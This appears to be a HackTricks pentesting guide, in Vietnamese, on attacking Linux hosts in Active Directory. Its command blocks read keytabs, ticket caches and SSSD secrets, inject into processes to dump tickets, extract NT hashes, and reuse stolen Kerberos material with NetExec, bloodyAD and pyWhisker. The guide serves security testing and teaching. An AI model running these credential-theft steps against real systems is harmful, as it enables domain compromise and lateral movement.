# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Máy Linux cũng có thể nằm trong môi trường Active Directory.

Máy Linux trong AD có thể **lưu trữ thông tin Kerberos cục bộ**: user ccache, keytab của máy/dịch vụ và các bí mật do SSSD quản lý. Những artefact này thường có thể được tái sử dụng như mọi thông tin xác thực Kerberos khác. Để đọc hầu hết chúng, bạn cần là user sở hữu ticket hoặc là **root** trên máy.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Liệt kê

### Liệt kê AD từ Linux

Nếu bạn có quyền truy cập vào AD từ Linux (hoặc bash trên Windows), bạn có thể thử dùng [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) để liệt kê AD.

Bạn cũng có thể xem trang sau để tìm hiểu **các cách khác để liệt kê AD từ Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA là một **giải pháp thay thế** mã nguồn mở cho **Active Directory** của Microsoft Windows, chủ yếu dành cho môi trường **Unix**. FreeIPA kết hợp một **thư mục LDAP** hoàn chỉnh với Trung tâm phân phối khóa **Kerberos** của MIT để quản lý tương tự Active Directory. FreeIPA sử dụng **Certificate System** của Dogtag để quản lý chứng chỉ CA và RA, đồng thời hỗ trợ xác thực **đa yếu tố**, bao gồm cả smartcard. SSSD được tích hợp để xử lý quy trình xác thực Unix.<sup>[[14]](#references)[[15]](#references)</sup> Tìm hiểu thêm tại:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefact trên host đã tham gia domain

Trước khi xử lý ticket, hãy xác định **cách host tham gia AD** và **vị trí thực tế lưu trữ thông tin Kerberos**. Trên các host Linux hiện đại, việc này thường do `realmd` + `adcli` + `sssd` xử lý, chứ không chỉ là các tệp thông thường trong `/tmp`.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

Điều này nhanh chóng cho bạn biết host có tin cậy AD hay không, SSSD có đang cache danh tính hoặc ticket hay không, và liệu **machine/service keytab** hoặc **KCM secret** có sẵn để khai thác hay không.<sup>[[4]](#references)[[10]](#references)</sup>

Phân biệt `/var/lib/sss/db/cache_*.ldb` với Kerberos ccache và `/var/lib/sss/secrets/secrets.ldb`. Các file `cache_*.ldb` có thể chứa trình xác minh mật khẩu offline khi domain có `cache_credentials = true` **và** người dùng đã xác thực trên host đó trước đây. Thông thường, chỉ người dùng có quyền cao mới đọc được chúng. Chỉ riêng file cache hoặc setting được bật không chứng minh rằng có mật khẩu hiện tại và dùng được; hãy xem xét setting hiệu lực theo từng domain và danh tính thực sự được cache trước khi kết luận. Xem [tài liệu về bộ nhớ đệm thông tin xác thực của Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). Với ranh giới danh tính Linux-to-AD riêng biệt, [ánh xạ tên Kerberos giữa các nhà cung cấp khác nhau](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) chỉ có ý nghĩa khi một service chấp nhận ticket và ánh xạ principal của nó sang tài khoản Unix liên quan.

Trên host có `ksu`, một Kerberos principal hợp lệ có thể truy cập **tài khoản đích cục bộ**, bao gồm root, chỉ khi tài khoản đó cho phép principal này. [Tài liệu MIT Kerberos](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) mô tả các file `.k5login` và `.k5users` trong home của tài khoản đích, cùng cơ chế fallback ánh xạ tên khi cả hai file đều không tồn tại. `.k5users` cũng có thể giới hạn các lệnh dùng với `ksu -e`; chỉ riêng tên file không chứng minh rằng có thể truy cập shell. Hãy kiểm tra chính xác tài khoản đích, quyền sở hữu/quyền truy cập file và các mục cấp quyền có thể đọc được, Kerberos credential khả dụng, cũng như các quy tắc ánh xạ hiệu lực. Nếu không thể truy cập home của root thì trạng thái cấp quyền vẫn chưa xác định. Việc dò tìm thụ động chỉ nên liệt kê các đường dẫn và quyền này, không yêu cầu ticket hoặc chạy `ksu`.

Một bản backup theo lịch có thể gián tiếp tạo ra ranh giới cấp quyền `.k5login`. Nếu tài khoản có quyền cao sao chép đệ quy một thư mục mà người dùng có quyền thấp có thể ghi vào home của chính nó, hãy xác minh rằng thao tác sao chép bao gồm các file ẩn, đường dẫn đích là home hiệu lực của tài khoản, và file được tạo có quyền sở hữu được dịch vụ Kerberos login chấp nhận. Ví dụ, [tài liệu rsync](https://download.samba.org/pub/rsync/rsync.1.html) nêu rằng `-a --no-owner` khiến các file đích mới thuộc sở hữu của người dùng nhận. [Tài liệu MIT Kerberos](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html) mô tả cách principal trong `.k5login` của người dùng đó có thể cấp quyền truy cập. Hãy xác nhận danh tính RunAs của scheduled job, quyền ghi vào nguồn, các tùy chọn rsync hiệu lực, đăng nhập có bật GSSAPI và ticket hợp lệ cho principal được liệt kê; chỉ riêng thư mục nguồn có thể ghi hoặc lệnh rsync chạy theo lịch không chứng minh được khả năng này.

Một keytab đọc được cũng cần được xem xét riêng theo từng principal. Keytab chứa principal có tên gợi ý quyền quản trị tự nó không chứng minh có quyền quản trị: chính sách [`kadm5.acl` của KDC](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html) kiểm soát các thao tác principal được phép. Hãy xác nhận riêng principal, ACL hiệu lực và quyền cấp phép đăng nhập hoặc `ksu` cục bộ trước khi xem quyền truy cập keytab là con đường lên root. Việc phân loại thụ động có thể liệt kê đường dẫn và quyền của keytab mà không dùng các key trong đó hoặc liên hệ với KDC.

## Thử nghiệm với ticket

### Pass The Ticket

Trong trang này, bạn sẽ tìm thấy các vị trí có thể **tìm Kerberos ticket bên trong host Linux**. Trang tiếp theo hướng dẫn cách chuyển đổi định dạng CCache ticket này sang Kirbi (định dạng cần dùng trên Windows), cũng như cách thực hiện tấn công PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Nếu bạn muốn tìm hiểu các **quy trình thu thập ticket dành riêng cho Linux** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, v.v.), hãy xem trang chuyên biệt:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Tái sử dụng CCACHE ticket từ /tmp

File CCACHE là định dạng nhị phân dùng để **lưu trữ Kerberos credential**. `FILE:/tmp/krb5cc_%{uid}` vẫn phổ biến, nhưng các môi trường Linux hiện đại cũng dùng `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` hoặc `KCM:%{uid}`. Hãy kiểm tra biến môi trường **`KRB5CCNAME`** và setting `default_ccache_name` trước khi cho rằng ticket nằm trong `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Tái sử dụng ticket CCACHE từ keyring

**Có thể trích xuất ticket Kerberos được lưu trong bộ nhớ của một process**, đặc biệt khi tính năng bảo vệ ptrace của máy bị tắt (`/proc/sys/kernel/yama/ptrace_scope`). Một công cụ hữu ích cho mục đích này có tại [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), giúp trích xuất bằng cách inject vào các phiên và dump ticket vào `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Để cấu hình và sử dụng công cụ này, hãy làm theo các bước dưới đây:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Quy trình này sẽ thử inject vào nhiều phiên khác nhau, cho biết thành công bằng cách lưu các ticket đã trích xuất vào `/tmp` theo quy ước đặt tên `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Tái sử dụng ticket CCACHE từ SSSD KCM

SSSD duy trì một bản sao của cơ sở dữ liệu tại đường dẫn `/var/lib/sss/secrets/secrets.ldb`. Khóa tương ứng được lưu dưới dạng tệp ẩn tại đường dẫn `/var/lib/sss/secrets/.secrets.mkey`. Theo mặc định, chỉ có thể đọc khóa nếu bạn có quyền **root**.<sup>[[4]](#references)</sup>

Chạy **`SSSDKCMExtractor`** với các tham số --database và --key sẽ phân tích cú pháp cơ sở dữ liệu và **giải mã các bí mật**.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Extractor in ra các payload JSON Kerberos thô; hãy chuyển chúng thành ticket cache có thể sử dụng hoặc định dạng ticket khác trước khi thực hiện pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Kiểm tra sơ bộ keytab nhanh

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Trích xuất tài khoản từ /etc/krb5.keytab

Các khóa tài khoản dịch vụ, thiết yếu đối với các dịch vụ hoạt động với quyền root, được lưu trữ an toàn trong các tệp **`/etc/krb5.keytab`**. Những khóa này, tương tự mật khẩu của dịch vụ, cần được bảo mật nghiêm ngặt.<sup>[[5]](#references)</sup>

Có thể dùng **`klist`** để kiểm tra nội dung của tệp keytab. Trên Linux, `klist -k -K -e` in ra các principal, số phiên bản khóa, loại mã hóa và dữ liệu khóa thô. Nếu loại khóa là **23 / RC4-HMAC**, giá trị khóa cũng chính là **NT hash** của principal đó.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Đối với người dùng Linux, **`KeyTabExtract`** cung cấp chức năng trích xuất hash RC4 HMAC, có thể được tận dụng để tái sử dụng NTLM hash. Lưu ý rằng cách này chỉ hữu ích khi keytab vẫn chứa material **etype 23 / RC4-HMAC**. Trong môi trường **chỉ dùng AES**, bạn có thể không lấy được NT hash có thể tái sử dụng, nhưng vẫn có thể xác thực trực tiếp bằng keytab qua Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

Trên macOS, **`bifrost`** là công cụ phân tích tệp keytab.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Dựa trên thông tin tài khoản và hash đã trích xuất, có thể thiết lập kết nối đến máy chủ bằng các công cụ như **`NetExec`**.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### Tái sử dụng machine account từ `/etc/krb5.keytab`

Trên các hệ thống được tham gia domain bằng `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` thường chứa **computer account** và một hoặc nhiều **host/service principal**. Nếu có **root**, đừng chỉ dump keytab: hãy dùng một trong các principal được liệt kê bằng `klist -k` để yêu cầu TGT và hoạt động với tư cách chính máy chủ Linux đó.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

Điều này đặc biệt hữu ích khi chính **đối tượng máy tính** có quyền được ủy quyền trong AD hoặc khi host được phép truy xuất các secret khác như **gMSA**.<sup>[[13]](#references)</sup>

### Tái sử dụng Kerberos material bị đánh cắp bằng công cụ AD ưu tiên Linux

Khi đã có `ccache` hợp lệ hoặc keytab có thể sử dụng, bạn có thể thao tác trực tiếp với AD **từ Linux** mà không cần chuyển đổi mọi thứ sang định dạng Windows trước. Nhiều công cụ hiện đại hỗ trợ xác thực Kerberos nguyên bản thông qua `KRB5CCNAME`.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

Đây là cầu nối hữu ích giữa **hậu khai thác Linux** và **lạm dụng đối tượng AD**. Để tìm hiểu chính các hướng lạm dụng ở cấp đối tượng, hãy xem:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Dấu vết gMSA / Managed Service Account trên Linux

Các triển khai Linux gần đây có thể trực tiếp sử dụng **Managed Service Accounts** từ AD. Trên thực tế, điều này có nghĩa là sau khi xâm nhập một máy chủ Linux, bạn có thể tìm thấy không chỉ host keytab mà còn cả **keytab dành riêng cho dịch vụ** được tạo từ gMSA. Những nơi thường cần kiểm tra gồm `/etc/gmsad.conf`, các tệp cấu hình riêng của từng triển khai và các tệp `*.keytab` bổ sung trong `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

Điều này cung cấp cho bạn một danh tính Kerberos có thể tái sử dụng cho các SPN được liên kết với gMSA đó **mà không cần chạm đến bất kỳ endpoint Windows nào**.<sup>[[13]](#references)</sup> Để tìm hiểu về việc lạm dụng gMSA/dMSA **ở phía domain** sau khi có đặc quyền cao hơn trong AD, hãy xem:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Cách tấn công Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Truy cập AD bằng tài khoản dịch vụ được quản lý – Tích hợp hệ thống RHEL trực tiếp với Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Biến môi trường Kerberos – Tài liệu MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Tài liệu MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Các loại mã hóa Kerberos RC4-HMAC được Microsoft Windows sử dụng](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Sử dụng Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Khám phá và tham gia các miền Identity | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Hướng dẫn sử dụng bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Giới thiệu | Tài liệu FreeIPA](https://www.freeipa.org/About.html)
- [15] [Ghi chú phát hành FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Tài liệu Linux Kernel](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Tài liệu MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
